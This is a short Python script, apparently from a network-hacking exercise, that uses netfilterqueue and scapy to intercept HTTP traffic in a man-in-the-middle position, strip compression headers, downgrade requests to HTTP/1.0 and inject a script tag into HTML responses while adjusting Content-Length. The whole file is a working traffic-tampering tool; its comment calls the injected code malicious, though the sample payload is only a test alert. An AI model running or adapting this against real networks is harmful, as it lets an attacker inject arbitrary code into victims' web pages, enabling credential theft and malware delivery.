import netfilterqueue
import scapy.all as scapy
import re

# only works for http, not https


def set_load(scapy_packet, load):

    scapy_packet[scapy.Raw].load = load

    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet


def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):

        packet_load = scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 10000:

            print("[+] Request")

            packet_load = re.sub("Accept-Encoding:.*?\\r\\n", "", packet_load)
            packet_load = packet_load.replace("HTTP/1.1", "HTTP/1.0")

        # http response. inject malicious code into the html
        elif scapy_packet[scapy.TCP].sport == 10000:

            print("[+] Response")

            injection_code = "<script>alert('test');</script>"

            packet_load = packet_load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", packet_load)

            if content_length_search and "text/html" in packet_load:

                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                packet_load = packet_load.replace(content_length, str(new_content_length))

        if packet_load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, packet_load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
